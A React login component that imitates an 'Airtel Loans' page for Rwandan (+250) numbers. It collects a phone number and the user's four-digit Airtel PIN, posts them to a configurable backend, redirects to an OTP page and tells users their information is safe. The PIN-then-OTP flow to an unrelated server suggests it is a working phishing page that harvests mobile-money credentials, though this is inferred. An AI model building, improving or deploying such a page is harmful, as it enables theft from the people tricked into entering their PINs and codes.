import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom'; // <-- 1. Import useNavigate
import './App.css';

function AirtelLogin() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [error, setError] = useState('Enter Airtel number.');
  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate(); // <-- 2. Initialize navigate

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const pinString = pin.join('');
    
    if (phone.length < 9) {
      setError('Enter a valid Airtel number.');
      return;
    }
    if (pinString.length < 4) {
      setError('Enter your Airtel PIN.');
      return;
    }
    
    setError('');

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: `+250${phone}`, pin: pinString }),
      });
      const data = await response.json();
      
      if (data.status === "success") {
        navigate('/airtel-otp'); // <--- 3. Redirects to the OTP page
      } else {
        setError(data.message || 'Login failed.');
      }
    } catch {
      setError('Error connecting to backend.');
    }
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        <h2 className="airtel-welcome">Welcome back</h2>
        <p className="airtel-subtext">Log in to Airtel Account</p>

        {/* Error Alert Box */}
        {error && (
          <div className="airtel-alert">
            <div className="alert-icon">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="16" x2="12" y2="12"></line>
                <line x1="12" y1="8" x2="12.01" y2="8"></line>
              </svg>
            </div>
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleLogin}>
          {/* Phone Number Input */}
          <div className="airtel-input-group">
            <label>Phone Number</label>
            <div className="airtel-phone-container">
              <div className="airtel-country-code">+250</div>
              <input 
                type="tel" 
                placeholder="7XX XXX XXX" 
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                maxLength={9}
              />
            </div>
          </div>

          {/* PIN Input */}
          <div className="airtel-input-group">
            <label>Enter Your Airtel PIN</label>
            <div className="airtel-pin-container">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  type="password"
                  maxLength={1}
                  value={digit}
                  placeholder="-"
                  ref={(el) => { pinRefs.current[index] = el; }}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="airtel-pin-box"
                />
              ))}
            </div>
          </div>

          {/* Login Button */}
          <button type="submit" className="airtel-login-btn">
            Login
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </button>
        </form>

        {/* Footer Security Message */}
        <div className="airtel-footer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          </svg>
          <span>Your information is safe and secure</span>
        </div>
      </div>
    </div>
  );
}

export default AirtelLogin;